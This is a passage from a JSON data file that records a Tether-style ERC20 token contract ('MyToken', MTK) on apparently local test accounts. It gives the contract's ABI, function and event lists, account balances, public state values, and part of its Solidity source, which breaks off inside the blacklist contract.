"decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0x0290FB167208Af455bB137780163b7B7a9a10C16": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99857893180000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 96999153260000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        